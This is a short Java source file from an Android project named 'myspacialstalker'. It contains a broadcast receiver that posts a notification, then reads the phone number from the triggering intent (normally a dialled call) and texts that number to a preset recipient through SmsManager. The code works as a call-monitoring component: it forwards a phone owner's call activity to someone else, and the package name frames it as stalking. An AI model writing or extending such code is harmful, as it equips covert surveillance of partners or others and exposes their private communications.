package com.example.myspacialstalker;

import android.app.Notification;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.support.v4.app.NotificationCompat;
import android.support.v4.app.NotificationManagerCompat;
import android.telephony.SmsManager;

public class MyBroadcastReceiver extends BroadcastReceiver {

    static String msg;
    static String sendTo;

    @Override
    public void onReceive(Context context, Intent intent) {

        NotificationCompat.Builder builder = new NotificationCompat.Builder(context, "0")
                .setContentTitle("note").setSmallIcon(R.drawable.ic_launcher_foreground)
                .setContentText("sms being send")
                .setPriority(NotificationCompat.PRIORITY_DEFAULT);

//        Notification ntfc = new NotificationCompat.Builder(context, "0")
//                .setContentTitle("pppppp").setSmallIcon(R.drawable.ic_launcher_foreground)
//                .setPriority(NotificationCompat.PRIORITY_DEFAULT)
//                .build();

        NotificationManagerCompat notificationManager = NotificationManagerCompat.from(context);
        notificationManager.notify(0, builder.build());


        //create pending intents
        Intent sent = new Intent(context, SMSHandler.class);
        sent.setAction("sent");
        Intent received = new Intent(context, SMSReceived.class);
        received.setAction("received");

        PendingIntent sent_pi = PendingIntent.getBroadcast(context, 0, sent,0);
        PendingIntent received_pi = PendingIntent.getBroadcast(context, 0, received,0);


        String phone_number = intent.getStringExtra(Intent.EXTRA_PHONE_NUMBER);
        SmsManager smsManager = SmsManager.getDefault();
        smsManager.sendTextMessage(sendTo,null, msg + phone_number, sent_pi, received_pi);
    }



}
